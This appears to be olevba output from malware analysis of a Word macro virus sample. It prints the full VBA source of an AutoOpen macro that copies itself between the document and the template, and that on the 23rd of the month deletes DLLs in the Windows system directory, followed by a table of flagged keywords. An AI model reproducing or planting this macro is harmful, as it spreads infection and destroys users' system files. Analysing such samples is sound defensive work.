olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.z-3a5236f6c53281c159c121310c583b4a549774a2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.z-3a5236f6c53281c159c121310c583b4a549774a2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO aUTOoPeN.bas 
in file: Virus.MSWord.Minimal.z-3a5236f6c53281c159c121310c583b4a549774a2 - OLE stream: 'Macros/VBA/aUTOoPeN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim a$
Dim b$
On Error Resume Next
a$ = "aUTOoPeN"
b$ = WordBasic.[FileName$]() + ":" + a$
WordBasic.MacroCopy a$, b$
WordBasic.MacroCopy b$, a$
If (WordBasic.Day(WordBasic.Now()) = 23) Then
    WordBasic.Kill "c:\windows\system\*.dll"
    WordBasic.MsgBox "Azrael cleaned your system directory !!!"
End If
WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |aUTOoPeN            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

